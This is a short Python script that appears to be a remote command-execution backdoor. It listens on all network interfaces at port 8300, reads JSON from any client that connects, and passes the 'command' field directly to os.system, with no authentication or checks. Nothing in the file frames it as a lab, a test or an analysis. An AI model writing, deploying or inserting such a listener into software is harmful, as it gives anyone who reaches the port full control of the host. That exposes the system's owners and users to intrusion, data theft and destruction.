import socket
import json
import os 

host = '0.0.0.0'
port = 8300

service = socket.socket()
service.bind((host, port))

while True:
    service.listen(1)
    connection, address = service.accept()
    print("[+] Connection established with %s" % (str(address)))

    data = connection.recv(1024)

    try:
        jsonData = json.loads(data)
    except json.JSONDecodeError as e:
        print("[-] %s" % (str(e)))
        continue
    
    try:
        command = jsonData["command"]
    except KeyError as e:
        print("[-] %s" % (str(e)))
        continue

    try:
        os.system(command)
    except Exception as e:
        print("Ho", str(e))

connection.close()






